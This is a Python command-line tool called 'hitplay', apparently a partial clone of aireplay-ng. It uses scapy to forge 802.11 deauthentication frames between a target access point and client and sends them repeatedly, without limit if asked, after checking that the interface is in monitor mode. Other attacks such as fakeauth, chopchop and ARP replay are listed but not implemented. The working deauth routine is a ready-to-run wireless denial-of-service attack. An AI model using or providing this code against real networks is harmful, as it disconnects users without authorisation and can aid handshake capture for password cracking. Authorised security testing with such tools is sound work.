#!/usr/bin/env python3

import argparse
import os
import re
import sys
import argcomplete
from argcomplete.completers import ChoicesCompleter

from helpers import add_interface_argument, check_interface, check_mac

if "_ARGCOMPLETE" not in os.environ:
    from colorama import Fore
    from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
    from scapy.all import sendp
    from helpers import check_root, run_command

# TODO: Auto-completions
# TODO: Add documentation + Usage + Logo
# TODO: Add arguments checking
# TODO: Needs deep testing

# Still didn't decide what other tools to add beside deauth
ATTACK_DEFINITIONS = [
    ("deauth", "Deauthenticate one station.", True),
    ("fakeauth", "Fake authentication with an access point.", False),
    ("interactive", "Interactive frame selection.", False),
    ("arpreplay", "Standard ARP-request replay.", False),
    ("chopchop", "Decrypt or chopchop a WEP packet.", False),
    ("fragment", "Generate a valid keystream via fragmentation.", False),
    ("caffe-latte", "Query a client for new IVs.", False),
    ("cfrag", "Fragmentation attack against a client.", False),
    ("migmode", "Attack WPA migration mode.", False),
    ("test", "Test injection capability and link quality.", False),
]


def _check_monitor(interface):
    out, err = run_command(f"iw dev {interface} info")
    if err:
        print(f"{Fore.RED}An error occured: {err}")
        return False

    wireless_types = ["ibss", "monitor", "mesh", "wds", "managed"]

    for type in wireless_types:
        search = re.search(type, out)
        if search is not None:
            break
    result = search.group(0)

    if result == "monitor":
        return True, None
    else:
        return False, result


def _deauth_attack(interface, bssid, client, count):
    """
    Performs the deauthentication attack.

    :param interface: The wireless interface to use.
    :param bssid: The MAC address of the access point.
    :param client: The MAC address of the client to deauthenticate.
    :param count: The number of deauthentication packets to send.
    """
    is_monitor, _ = _check_monitor(interface=interface)
    if not is_monitor:
        print(
            f"{Fore.RED}Interface is not in monitor mode (current mode: {_}).\nUse hitmon to enable monitor mode."
        )
        sys.exit(1)

    print(f"Starting deauthentication attack on {bssid} for client {client}")

    packet_to_client = (
        RadioTap()
        / Dot11(addr1=client, addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )

    packet_to_ap = (
        RadioTap()
        / Dot11(addr1=bssid, addr2=client, addr3=bssid)
        / Dot11Deauth(reason=7)
    )

    packets = [packet_to_ap, packet_to_client]
    print("Sending deauthentication packets... Press Ctrl+C to stop.")

    sent_count = 0
    loop_forever = count == 0
    try:
        while loop_forever or sent_count < count:
            sendp(packets, iface=interface, verbose=False, count=1)
            sent_count += 1
            print(f"\rPackets sent: {sent_count}", end="")
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    finally:
        print(f"\nTotal packets sent: {sent_count}")


def main():
    art = r"""
 /$$       /$$   /$$               /$$                    
| $$      |__/  | $$              | $$                    
| $$$$$$$  /$$ /$$$$$$    /$$$$$$ | $$  /$$$$$$  /$$   /$$
| $$__  $$| $$|_  $$_/   /$$__  $$| $$ |____  $$| $$  | $$
| $$  \ $$| $$  | $$    | $$  \ $$| $$  /$$$$$$$| $$  | $$
| $$  | $$| $$  | $$ /$$| $$  | $$| $$ /$$__  $$| $$  | $$
| $$  | $$| $$  |  $$$$/| $$$$$$$/| $$|  $$$$$$$|  $$$$$$$
|__/  |__/|__/   \___/  | $$____/ |__/ \_______/ \____  $$
                        | $$                     /$$  | $$
                        | $$                    |  $$$$$$/
                        |__/                     \______/ 
"""
    parser = argparse.ArgumentParser(
        prog="hitplay",
        description=art
        + "\n\nA tool that does Deauthenticaion attack on wireless devices",
        epilog="@By NS-Guys",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    subparser = parser.add_subparsers(
        dest="attack", metavar="attack-mode", help="Attack mode"
    )
    subparser.required = True
    attack_names = [name for name, _, _ in ATTACK_DEFINITIONS]
    subparser.completer = ChoicesCompleter(attack_names)

    for name, help, implemented in ATTACK_DEFINITIONS:
        if implemented:
            help = help + " (Implemented)"
        else:
            help = help + " (Not Yet)"

        attack_parser = subparser.add_parser(name=name, help=help, description=help)
        add_interface_argument(attack_parser)
        attack_parser.set_defaults(implemented=implemented)
        if name == "deauth":
            attack_parser.add_argument(
                "-b",
                "--bssid",
                help="MAC address of the Access Point.",
            )
            attack_parser.add_argument(
                "-c",
                "--client",
                help="MAC address of the client.",
            )
            attack_parser.add_argument(
                "count",
                type=int,
                help="Number of deauthentication packets to send (0 for unlimited).",
            )

    argcomplete.autocomplete(parser)

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    if not getattr(args, "implemented", False):
        print(f"Attack '{args.attack}' is not implemented yet.")
        sys.exit(1)

    check_root()

    print("Starting hitplay-ng...")
    check_interface(args.interface)
    print(f"Interface: {args.interface}")
    print(f"Attack Mode: {args.attack}")

    bssid = getattr(args, "bssid", None)
    client = getattr(args, "client", None)

    if bssid:
        check_mac(bssid)
        print(f"Target BSSID: {args.bssid}")
    if client:
        check_mac(client)
        print(f"Target Client: {args.client}")

    if args.attack == "deauth":
        print(f"Deauth Count: {args.count}")
        if not bssid or not client:
            print(
                "Deauthentication attack requires both --bssid (-b) and --client (-c)."
            )
            sys.exit(1)

        _deauth_attack(args.interface, bssid, client, args.count)

    else:
        print(f"Attack '{args.attack}' is not implemented yet.")


if __name__ == "__main__":
    main()
